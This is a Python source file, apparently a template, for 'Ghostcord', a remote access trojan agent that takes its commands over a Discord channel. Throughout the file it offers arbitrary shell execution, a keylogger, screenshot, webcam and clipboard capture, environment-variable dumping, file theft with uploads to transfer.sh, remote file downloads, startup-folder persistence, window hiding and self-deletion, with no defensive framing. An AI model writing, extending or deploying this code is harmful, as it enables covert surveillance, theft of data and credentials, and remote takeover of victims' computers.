import discord
import asyncio
import os
import subprocess
import uuid
import platform
import socket
import sys
import webbrowser
import threading
import shutil
import time

try:
    import pyautogui
except ImportError:
    pyautogui = None
try:
    import cv2
except ImportError:
    cv2 = None
try:
    import pyperclip
except ImportError:
    pyperclip = None
try:
    import psutil
except ImportError:
    psutil = None
try:
    import winsound
except ImportError:
    winsound = None
# Ensure ctypes is always defined, even if import fails
try:
    import ctypes
except ImportError:
    ctypes = None
try:
    import requests
except ImportError:
    requests = None
try:
    import pyttsx3
except ImportError:
    pyttsx3 = None

# === CONFIGURATION ===
BOT_TOKEN = "{BOT_TOKEN}"
CHANNEL_ID = {CHANNEL_ID}
OWNER_ID = {OWNER_ID}

# === AGENT ID GENERATION ===
ID_FILE = '.ghostcord-id'
if os.path.exists(ID_FILE):
    with open(ID_FILE, 'r') as f:
        AGENT_ID = f.read().strip()
else:
    AGENT_ID = f'ghost{str(uuid.uuid4())[:8]}'
    with open(ID_FILE, 'w') as f:
        f.write(AGENT_ID)

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

keylogger_running = False
keylogger_log = []

COMMANDS_HELP_1 = '''
**Ghostcord Agent Commands (1/2)**

__**General**__
`!commands`                Show this help message
`!recon`                   System info
`!uptime`                  Show system uptime
`!battery`                 Show battery status
`!gettime`                 Get system time
`!settime <YYYY-MM-DD HH:MM:SS>`  Set system time
`!hostname`                Get hostname
`!sethostname <name>`      Set hostname
`!publicip`                Get public IP address
`!whoami`                  Show current user

__**File & Directory**__
`!ls <path>`               List files in directory
`!pwd`                     Get current directory
`!cd <path>`               Change directory
`!env`                     Get environment variables
`!download <path>`         Download file
`!upload`                  Upload file to agent
`!rm <path>`               Delete a file
`!mkdir <path>`            Create a directory
`!move <src> <dst>`        Move/rename a file
`!downloadurl <url> <path>` Download a file from the internet

__**System Control**__
`!shell <cmd>`             Run shell command
`!shutdown`                Shutdown/reboot
`!lock`                    Lock workstation
`!persist`                 Copy agent and .ghostcord-id to Windows startup
`!persistcheck`            Check if agent and .ghostcord-id are in startup
`!selfdestruct`            Delete agent and exit
`!sysupdate`               Run system update
'''

COMMANDS_HELP_2 = '''
**Ghostcord Agent Commands (2/2)**

__**Process & Services**__
`!listproc`                List running processes
`!killproc <pid|name>`     Kill process
`!services`                List services

__**Network**__
`!netstat`                 Show open network connections
`!ifconfig`                Show network interfaces and IPs
`!netscan <subnet>`        Scan subnet for live hosts

__**Monitoring & Info**__
`!screenshot`              Take a screenshot
`!camera`                  Take a webcam photo
`!sensors`                 Show CPU/GPU temperature
`!drives`                  List drives
`!users`                   List users
`!cpu`                     Show CPU usage
`!mem`                     Show memory usage
`!diskusage`               Show disk usage

__**Clipboard & Input**__
`!clipboard`               Get clipboard contents
`!setclipboard <text>`     Set clipboard contents
`!keylog start|stop|dump`  Keylogger control

__**Audio/Visual**__
`!beep`                    Play a beep sound
`!wallpaper <url>`         Set desktop wallpaper from a URL
`!speak <text>`            Text-to-speech
`!draw <text>`             Draw text on the screen
`!record <seconds>`        Record audio from mic

__**Window & UI**__
`!messagebox <text>`       Show a popup message
'''

def start_keylogger():
    global keylogger_running, keylogger_log
    try:
        import pynput.keyboard
    except ImportError:
        return 'pynput not installed.'
    keylogger_log = []
    keylogger_running = True
    def on_press(key):
        if not keylogger_running:
            return False
        try:
            keylogger_log.append(str(key.char))
        except AttributeError:
            keylogger_log.append(f'<{key}>')
        return None
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    return 'Keylogger started.'

def stop_keylogger():
    global keylogger_running
    keylogger_running = False
    return 'Keylogger stopped.'

async def register_agent():
    await client.wait_until_ready()
    channel = client.get_channel(CHANNEL_ID)
    if isinstance(channel, discord.TextChannel):
        await channel.send(f'!register {AGENT_ID}')
        print(f'[+] Registered agent {AGENT_ID} in channel {CHANNEL_ID}')
    else:
        print(f'[!] Channel {CHANNEL_ID} not found or not a text channel. Check your config.')

@client.event
async def on_ready():
    print(f'[+] Agent {AGENT_ID} connected as {client.user}')
    await register_agent()

async def send_result(message, result, file_path=None):
    if file_path and os.path.exists(file_path):
        await message.reply(file=discord.File(file_path))
        os.remove(file_path)
    else:
        await message.reply(result[:1900] or 'No output')

# Utility: upload file to transfer.sh
async def upload_to_transfersh(file_path):
    if not requests:
        return 'requests not installed.'
    try:
        with open(file_path, 'rb') as f:
            r = requests.put(f'https://transfer.sh/{os.path.basename(file_path)}', data=f)
        if r.status_code == 200:
            return r.text.strip()
        else:
            return f'Upload failed: {r.status_code} {r.text}'
    except Exception as e:
        return f'Error uploading: {e}'

@client.event
async def on_message(message):
    if message.channel.id != CHANNEL_ID:
        return
    if message.author.id != OWNER_ID:
        return
    if message.author == client.user:
        return
    content = message.content.strip()
    # !commands
    if content.startswith('!commands'):
        await send_result(message, COMMANDS_HELP_1)
        await send_result(message, COMMANDS_HELP_2)
    # !ls <path>
    elif content.startswith('!ls'):
        parts = content.split(maxsplit=1)
        path = parts[1] if len(parts) > 1 else '.'
        try:
            files = os.listdir(path)
            await send_result(message, '\n'.join(files) or 'No files.')
        except Exception as e:
            await send_result(message, f'Error listing files: {e}')
    # !rm <path>
    elif content.startswith('!rm'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !rm <path>')
            return
        try:
            os.remove(parts[1])
            await send_result(message, f'Removed: {parts[1]}')
        except Exception as e:
            await send_result(message, f'Error removing file: {e}')
    # !mkdir <path>
    elif content.startswith('!mkdir'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !mkdir <path>')
            return
        try:
            os.makedirs(parts[1], exist_ok=True)
            await send_result(message, f'Directory created: {parts[1]}')
        except Exception as e:
            await send_result(message, f'Error creating directory: {e}')
    # !move <src> <dst>
    elif content.startswith('!move'):
        parts = content.split(maxsplit=2)
        if len(parts) < 3:
            await send_result(message, 'Usage: !move <src> <dst>')
            return
        try:
            shutil.move(parts[1], parts[2])
            await send_result(message, f'Moved {parts[1]} to {parts[2]}')
        except Exception as e:
            await send_result(message, f'Error moving file: {e}')
    # !netstat
    elif content.startswith('!netstat'):
        try:
            if psutil:
                conns = psutil.net_connections()
                lines = [f'{c.laddr.ip}:{c.laddr.port} -> {c.raddr.ip}:{c.raddr.port} ({c.status})' for c in conns if c.raddr]
                await send_result(message, '\n'.join(lines) or 'No connections.')
            else:
                result = subprocess.check_output('netstat -an', shell=True, text=True)
                await send_result(message, result)
        except Exception as e:
            await send_result(message, f'Error: {e}')
    # !ifconfig
    elif content.startswith('!ifconfig'):
        try:
            if psutil:
                addrs = psutil.net_if_addrs()
                lines = []
                for iface, addrlist in addrs.items():
                    for addr in addrlist:
                        lines.append(f'{iface}: {addr.address}')
                await send_result(message, '\n'.join(lines))
            else:
                if platform.system() == 'Windows':
                    result = subprocess.check_output('ipconfig', shell=True, text=True)
                else:
                    result = subprocess.check_output('ifconfig', shell=True, text=True)
                await send_result(message, result)
        except Exception as e:
            await send_result(message, f'Error: {e}')
    # !downloadurl <url> <path>
    elif content.startswith('!downloadurl'):
        parts = content.split(maxsplit=2)
        if len(parts) < 3:
            await send_result(message, 'Usage: !downloadurl <url> <path>')
            return
        if not requests:
            await send_result(message, 'requests not installed.')
            return
        try:
            r = requests.get(parts[1], timeout=15)
            with open(parts[2], 'wb') as f:
                f.write(r.content)
            await send_result(message, f'Downloaded {parts[1]} to {parts[2]}')
        except Exception as e:
            await send_result(message, f'Error downloading: {e}')
    # !wallpaper <url>
    elif content.startswith('!wallpaper'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !wallpaper <url>')
            return
        if not requests:
            await send_result(message, 'requests not installed.')
            return
        try:
            img_path = f'wallpaper_{AGENT_ID}.jpg'
            r = requests.get(parts[1], timeout=15)
            with open(img_path, 'wb') as f:
                f.write(r.content)
            if platform.system() == 'Windows':
                if ctypes is not None:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(img_path), 3)
                    await send_result(message, 'Wallpaper set.')
                else:
                    await send_result(message, 'ctypes not installed. Cannot set wallpaper.')
            elif platform.system() == 'Darwin':
                script = f'''/usr/bin/osascript<<END
                tell application "Finder"
                set desktop picture to POSIX file "{os.path.abspath(img_path)}"
                end tell
                END'''
                os.system(script)
                await send_result(message, 'Wallpaper set.')
            else:
                await send_result(message, 'Not supported on this OS.')
        except Exception as e:
            await send_result(message, f'Error setting wallpaper: {e}')
    # !speak <text>
    elif content.startswith('!speak'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !speak <text>')
            return
        if not pyttsx3:
            await send_result(message, 'pyttsx3 not installed.')
            return
        try:
            engine = pyttsx3.init()
            engine.say(parts[1])
            engine.runAndWait()
            await send_result(message, 'Spoken!')
        except Exception as e:
            await send_result(message, f'Error speaking: {e}')
    # !draw <text>
    elif content.startswith('!draw'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2 or not pyautogui:
            await send_result(message, 'Usage: !draw <text> (requires pyautogui)')
            return
        try:
            pyautogui.moveTo(100, 100)
            pyautogui.click()
            pyautogui.typewrite(parts[1], interval=0.1)
            await send_result(message, 'Text drawn.')
        except Exception as e:
            await send_result(message, f'Error drawing: {e}')
    # !invert
    elif content.startswith('!invert'):
        if platform.system() == 'Windows' and ctypes is not None:
            try:
                # Windows Magnifier invert colors
                os.system('magctrl.exe /invert')
                await send_result(message, 'Invert command sent (requires magctrl.exe).')
            except Exception as e:
                await send_result(message, f'Error inverting: {e}')
        else:
            await send_result(message, 'Invert not supported on this OS.')
    # !hide
    elif content.startswith('!hide'):
        if platform.system() == 'Windows' and ctypes is not None:
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                await send_result(message, 'Agent window hidden.')
            except Exception as e:
                await send_result(message, f'Error hiding: {e}')
        else:
            await send_result(message, 'Hide not supported on this OS.')
    # !unhide
    elif content.startswith('!unhide'):
        if platform.system() == 'Windows' and ctypes is not None:
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
                await send_result(message, 'Agent window unhidden.')
            except Exception as e:
                await send_result(message, f'Error unhiding: {e}')
        else:
            await send_result(message, 'Unhide not supported on this OS.')
    # !sensors
    elif content.startswith('!sensors'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            temps = psutil.sensors_temperatures()
            lines = []
            for name, entries in temps.items():
                for entry in entries:
                    lines.append(f'{name}: {entry.label or "temp"} = {entry.current}C')
            await send_result(message, '\n'.join(lines) or 'No sensors found.')
        except Exception as e:
            await send_result(message, f'Error reading sensors: {e}')
    # !uptime
    elif content.startswith('!uptime'):
        try:
            if psutil:
                uptime = time.time() - psutil.boot_time()
                await send_result(message, f'Uptime: {uptime/3600:.2f} hours')
            else:
                await send_result(message, 'psutil not installed.')
        except Exception as e:
            await send_result(message, f'Error getting uptime: {e}')
    # !battery
    elif content.startswith('!battery'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            batt = psutil.sensors_battery()
            if batt:
                await send_result(message, f'Battery: {batt.percent}% (plugged in: {batt.power_plugged})')
            else:
                await send_result(message, 'No battery found.')
        except Exception as e:
            await send_result(message, f'Error getting battery: {e}')
    # !shell <command>
    elif content.startswith('!shell'):
        command = content[len('!shell'):].strip()
        print(f'[>] Received shell command: {command}')
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30, text=True)
        except Exception as e:
            result = f'Error: {e}'
        await send_result(message, result)
        print(f'[<] Sent result for shell command')
    # !screenshot
    elif content.startswith('!screenshot'):
        if pyautogui is None:
            await send_result(message, 'pyautogui not installed. Cannot take screenshot.')
            return
        screenshot_path = f'screenshot_{AGENT_ID}.png'
        try:
            pyautogui.screenshot(screenshot_path)
            await send_result(message, 'Screenshot:', file_path=screenshot_path)
        except Exception as e:
            await send_result(message, f'Error taking screenshot: {e}')
    # !camera
    elif content.startswith('!camera'):
        if cv2 is None:
            await send_result(message, 'opencv-python not installed. Cannot access camera.')
            return
        cam_path = f'camera_{AGENT_ID}.jpg'
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(cam_path, frame)
                await send_result(message, 'Camera photo:', file_path=cam_path)
            else:
                await send_result(message, 'Failed to capture image.')
            cap.release()
        except Exception as e:
            await send_result(message, f'Error using camera: {e}')
    # !openurl <url>
    elif content.startswith('!openurl'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !openurl <url>')
            return
        url = parts[1].strip()
        try:
            webbrowser.open(url)
            await send_result(message, f'Opened URL: {url}')
        except Exception as e:
            await send_result(message, f'Error opening URL: {e}')
    # !messagebox <text>
    elif content.startswith('!messagebox'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !messagebox <text>')
            return
        text = parts[1].strip()
        try:
            if platform.system() == 'Windows' and ctypes is not None:
                ctypes.windll.user32.MessageBoxW(0, text, "Ghostcord", 1)
            elif pyautogui and hasattr(pyautogui, 'alert'):
                pyautogui.alert(text)
            else:
                await send_result(message, 'No supported method for messagebox.')
                return
            await send_result(message, 'Message box shown.')
        except Exception as e:
            await send_result(message, f'Error showing messagebox: {e}')
    # !beep
    elif content.startswith('!beep'):
        try:
            if platform.system() == 'Windows' and winsound:
                winsound.Beep(1000, 500)
            elif platform.system() == 'Linux':
                os.system('beep')
            else:
                print('\a')
            await send_result(message, 'Beeped!')
        except Exception as e:
            await send_result(message, f'Error beeping: {e}')
    # !lock
    elif content.startswith('!lock'):
        try:
            if platform.system() == 'Windows' and ctypes is not None:
                ctypes.windll.user32.LockWorkStation()
                await send_result(message, 'Workstation locked.')
            elif platform.system() == 'Linux':
                os.system('gnome-screensaver-command -l')
                await send_result(message, 'Screen locked.')
            else:
                await send_result(message, 'Lock not supported on this OS.')
        except Exception as e:
            await send_result(message, f'Error locking: {e}')
    # !shutdown
    elif content.startswith('!shutdown'):
        try:
            if platform.system() == 'Windows':
                os.system('shutdown /s /t 1')
            elif platform.system() == 'Linux':
                os.system('shutdown now')
            else:
                await send_result(message, 'Shutdown not supported on this OS.')
                return
            await send_result(message, 'Shutdown command sent.')
        except Exception as e:
            await send_result(message, f'Error shutting down: {e}')
    # !clipboard
    elif content.startswith('!clipboard'):
        if pyperclip is None:
            await send_result(message, 'pyperclip not installed.')
            return
        try:
            clip = pyperclip.paste()
            await send_result(message, f'Clipboard: {clip}')
        except Exception as e:
            await send_result(message, f'Error getting clipboard: {e}')
    # !setclipboard <text>
    elif content.startswith('!setclipboard'):
        if pyperclip is None:
            await send_result(message, 'pyperclip not installed.')
            return
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !setclipboard <text>')
            return
        try:
            pyperclip.copy(parts[1])
            await send_result(message, 'Clipboard set.')
        except Exception as e:
            await send_result(message, f'Error setting clipboard: {e}')
    # !keylog start|stop|dump
    elif content.startswith('!keylog'):
        parts = content.split()
        if len(parts) < 2:
            await send_result(message, 'Usage: !keylog start|stop|dump')
            return
        action = parts[1]
        if action == 'start':
            result = start_keylogger()
            await send_result(message, result)
        elif action == 'stop':
            result = stop_keylogger()
            await send_result(message, result)
        elif action == 'dump':
            await send_result(message, ''.join(keylogger_log))
        else:
            await send_result(message, 'Usage: !keylog start|stop|dump')
    # !listproc
    elif content.startswith('!listproc'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            procs = [f'{p.pid}: {p.name()}' for p in psutil.process_iter(['pid', 'name'])]
            await send_result(message, '\n'.join(procs))
        except Exception as e:
            await send_result(message, f'Error listing processes: {e}')
    # !killproc <pid|name>
    elif content.startswith('!killproc'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !killproc <pid|name>')
            return
        target = parts[1].strip()
        try:
            killed = False
            if target.isdigit():
                p = psutil.Process(int(target))
                p.terminate()
                killed = True
            else:
                for p in psutil.process_iter(['name']):
                    if p.info['name'] == target:
                        p.terminate()
                        killed = True
            if killed:
                await send_result(message, f'Process {target} killed.')
            else:
                await send_result(message, f'Process {target} not found.')
        except Exception as e:
            await send_result(message, f'Error killing process: {e}')
    # !recon
    elif content.startswith('!recon'):
        info = []
        info.append(f'Agent ID: {AGENT_ID}')
        info.append(f'Hostname: {socket.gethostname()}')
        info.append(f'IP: {socket.gethostbyname(socket.gethostname())}')
        info.append(f'User: {os.getlogin()}')
        info.append(f'OS: {platform.system()} {platform.release()}')
        info.append(f'Platform: {platform.platform()}')
        info.append(f'Python: {platform.python_version()}')
        await send_result(message, '\n'.join(info))
    # !download <path>
    elif content.startswith('!download'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !download <path>')
            return
        file_path = parts[1].strip()
        if not os.path.exists(file_path):
            await send_result(message, f'File not found: {file_path}')
            return
        try:
            file_size = os.path.getsize(file_path)
            if file_path.endswith('.bin') or file_size > 8*1024*1024:
                link = await upload_to_transfersh(file_path)
                await send_result(message, f'File uploaded to transfer.sh: {link}')
            else:
                await message.reply(file=discord.File(file_path))
        except Exception as e:
            await send_result(message, f'Error sending file: {e}')
    # !selfdestruct
    elif content.startswith('!selfdestruct'):
        await send_result(message, 'Self-destructing...')
        try:
            os.remove(sys.argv[0])
        except Exception as e:
            print(f'Error deleting self: {e}')
        sys.exit(0)
    # !persist
    elif content.startswith('!persist'):
        if platform.system() == 'Windows':
            try:
                startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
                dest = os.path.join(startup, os.path.basename(sys.argv[0]))
                shutil.copy2(sys.argv[0], dest)
                # Also copy .ghostcord-id
                id_src = os.path.join(os.path.dirname(sys.argv[0]), '.ghostcord-id')
                id_dest = os.path.join(startup, '.ghostcord-id')
                if os.path.exists(id_src):
                    shutil.copy2(id_src, id_dest)
                await send_result(message, f'Agent and .ghostcord-id copied to startup: {dest}, {id_dest}')
            except Exception as e:
                await send_result(message, f'Error copying to startup: {e}')
        else:
            await send_result(message, 'Persistence only implemented for Windows.')
    # !persistcheck
    elif content.startswith('!persistcheck'):
        if platform.system() == 'Windows':
            try:
                startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
                dest = os.path.join(startup, os.path.basename(sys.argv[0]))
                id_dest = os.path.join(startup, '.ghostcord-id')
                found = []
                if os.path.exists(dest):
                    found.append(dest)
                if os.path.exists(id_dest):
                    found.append(id_dest)
                if found:
                    await send_result(message, f'Found in startup: {', '.join(found)}')
                else:
                    await send_result(message, 'Agent and .ghostcord-id not found in startup.')
            except Exception as e:
                await send_result(message, f'Error checking persistence: {e}')
        else:
            await send_result(message, 'Persistence check only implemented for Windows.')
    # !pwd
    elif content.startswith('!pwd'):
        await send_result(message, os.getcwd())
    # !cd <path>
    elif content.startswith('!cd'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !cd <path>')
            return
        try:
            os.chdir(parts[1])
            await send_result(message, f'Changed directory to: {os.getcwd()}')
        except Exception as e:
            await send_result(message, f'Error changing directory: {e}')
    # !env
    elif content.startswith('!env'):
        await send_result(message, '\n'.join([f'{k}={v}' for k, v in os.environ.items()]))
    # !netscan <subnet>
    elif content.startswith('!netscan'):
        if not requests:
            await send_result(message, 'requests not installed.')
            return
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !netscan <subnet>')
            return
        subnet = parts[1].strip()
        if not subnet.endswith('/24'):
            await send_result(message, 'Subnet must end with /24 (e.g., 192.168.1.0/24)')
            return
        try:
            ip_list = []
            for i in range(1, 255):
                ip = f'{subnet[:-3]}{i}'
                try:
                    socket.create_connection((ip, 80), timeout=2) # Simple port check
                    ip_list.append(ip)
                except:
                    pass
            await send_result(message, '\n'.join(ip_list) or 'No hosts found.')
        except Exception as e:
            await send_result(message, f'Error scanning subnet: {e}')
    # !publicip
    elif content.startswith('!publicip'):
        if not requests:
            await send_result(message, 'requests not installed.')
            return
        try:
            r = requests.get('https://api.ipify.org')
            await send_result(message, f'Public IP: {r.text.strip()}')
        except Exception as e:
            await send_result(message, f'Error getting public IP: {e}')
    # !users
    elif content.startswith('!users'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            users = psutil.users()
            lines = []
            for u in users:
                # Only show safe attributes
                lines.append(f'User: {u.name}')
            await send_result(message, '\n'.join(lines) or 'No users found.')
        except Exception as e:
            await send_result(message, f'Error listing users: {e}')
    # !drives
    elif content.startswith('!drives'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            drives = psutil.disk_partitions()
            lines = []
            for d in drives:
                lines.append(f'Drive: {d.device} (Type: {d.fstype})')
            await send_result(message, '\n'.join(lines) or 'No drives found.')
        except Exception as e:
            await send_result(message, f'Error listing drives: {e}')
    # !record <seconds>
    elif content.startswith('!record'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !record <seconds>')
            return
        try:
            seconds = int(parts[1])
            if seconds <= 0:
                await send_result(message, 'Seconds must be positive.')
                return
            audio_path = f'audio_{AGENT_ID}.wav'
            subprocess.call(["arecord", "-f", "S16_LE", "-r", "44100", audio_path])
            await send_result(message, f'Audio recorded to {audio_path}')
        except Exception as e:
            await send_result(message, f'Error recording audio: {e}')
    # !gettime
    elif content.startswith('!gettime'):
        await send_result(message, time.strftime('%Y-%m-%d %H:%M:%S'))
    # !settime <YYYY-MM-DD HH:MM:SS>
    elif content.startswith('!settime'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !settime <YYYY-MM-DD HH:MM:SS>')
            return
        try:
            time.strptime(parts[1], '%Y-%m-%d %H:%M:%S')
            os.system(f'date "{parts[1]}"')
            await send_result(message, f'System time set to: {parts[1]}')
        except Exception as e:
            await send_result(message, f'Error setting system time: {e}')
    # !sysupdate
    elif content.startswith('!sysupdate'):
        if platform.system() == 'Windows':
            try:
                subprocess.call(["wmic", "product", "get", "name"])
                await send_result(message, 'Windows system update command sent.')
            except Exception as e:
                await send_result(message, f'Error sending Windows system update: {e}')
        elif platform.system() == 'Linux':
            try:
                subprocess.call(["apt-get", "update"])
                subprocess.call(["apt-get", "upgrade", "-y"])
                await send_result(message, 'Linux system update command sent.')
            except Exception as e:
                await send_result(message, f'Error sending Linux system update: {e}')
        else:
            await send_result(message, 'System update only implemented for Windows and Linux.')
    # !screenshotwin
    elif content.startswith('!screenshotwin'):
        if pyautogui is None:
            await send_result(message, 'pyautogui not installed. Cannot take screenshot.')
            return
        try:
            try:
                import pygetwindow
            except ImportError:
                await send_result(message, 'pygetwindow not installed. Cannot get active window.')
                return
            active_window = pygetwindow.getActiveWindow()
            if active_window:
                title = active_window.title
                screenshot_path = f'screenshotwin_{AGENT_ID}_{title}.png'
                region = (int(active_window.left), int(active_window.top), int(active_window.width), int(active_window.height))
                pyautogui.screenshot(screenshot_path, region=region)
                await send_result(message, f'Screenshot of active window "{title}" saved to {screenshot_path}')
            else:
                await send_result(message, 'No active window found.')
        except Exception as e:
            await send_result(message, f'Error taking screenshot of active window: {e}')
    # !services
    elif content.startswith('!services'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            lines = []
            if platform.system() == 'Windows':
                for s in psutil.win_service_iter():
                    lines.append(f'Service: {s.name()} (Status: {s.status()})')
            elif platform.system() == 'Linux':
                result = subprocess.check_output(['systemctl', 'list-units', '--type=service', '--no-pager'], text=True)
                lines.append(result)
            else:
                lines.append('Service listing not implemented for this OS.')
            await send_result(message, '\n'.join(lines) or 'No services found.')
        except Exception as e:
            await send_result(message, f'Error listing services: {e}')
    # !hostname
    elif content.startswith('!hostname'):
        await send_result(message, socket.gethostname())
    # !sethostname <name>
    elif content.startswith('!sethostname'):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await send_result(message, 'Usage: !sethostname <name>')
            return
        try:
            os.system(f'hostname {parts[1]}')
            await send_result(message, f'Hostname set to: {parts[1]}')
        except Exception as e:
            await send_result(message, f'Error setting hostname: {e}')
    # !agents
    elif content.startswith('!agents'):
        # The agent can only reply with its own info
        await send_result(message, f'Agent ID: {AGENT_ID}\nHostname: {socket.gethostname()}\nChannel ID: {CHANNEL_ID}')
    # !register <agent_id>
    elif content.startswith('!register'):
        # Only respond if the agent_id matches this agent
        parts = content.split(maxsplit=1)
        if len(parts) > 1 and parts[1].strip() == AGENT_ID:
            await send_result(message, f'Agent {AGENT_ID} registered.')
    # !exec <command> (legacy)
    elif content.startswith('!exec '):
        command = content[len('!exec '):].strip()
        print(f'[>] Received exec command: {command}')
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30, text=True)
        except Exception as e:
            result = f'Error: {e}'
        await send_result(message, result)
        print(f'[<] Sent result for exec command')
    # !cpu
    elif content.startswith('!cpu'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            cpu = psutil.cpu_percent(interval=1)
            await send_result(message, f'CPU Usage: {cpu}%')
        except Exception as e:
            await send_result(message, f'Error getting CPU usage: {e}')
    # !mem
    elif content.startswith('!mem'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            mem = psutil.virtual_memory()
            await send_result(message, f'Memory Usage: {mem.percent}% ({mem.used // (1024*1024)}MB/{mem.total // (1024*1024)}MB)')
        except Exception as e:
            await send_result(message, f'Error getting memory usage: {e}')
    # !diskusage
    elif content.startswith('!diskusage'):
        if psutil is None:
            await send_result(message, 'psutil not installed.')
            return
        try:
            du = psutil.disk_usage('/')
            await send_result(message, f'Disk Usage: {du.percent}% ({du.used // (1024*1024*1024)}GB/{du.total // (1024*1024*1024)}GB)')
        except Exception as e:
            await send_result(message, f'Error getting disk usage: {e}')
    # !whoami
    elif content.startswith('!whoami'):
        try:
            await send_result(message, os.getlogin())
        except Exception as e:
            await send_result(message, f'Error: {e}')

async def main_loop():
    while True:
        try:
            await client.start(BOT_TOKEN)
        except Exception as e:
            print(f'[!] Disconnected or error: {e}. Reconnecting in 10 seconds...')
            await asyncio.sleep(10)

if __name__ == '__main__':
    print(f'[*] Starting Ghostcord agent with ID: {AGENT_ID}')
    print(f'[*] Using channel ID: {CHANNEL_ID}')
    print(f'[*] Using bot token: {BOT_TOKEN[:10]}...')
    try:
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        print('[*] Agent stopped by user.') 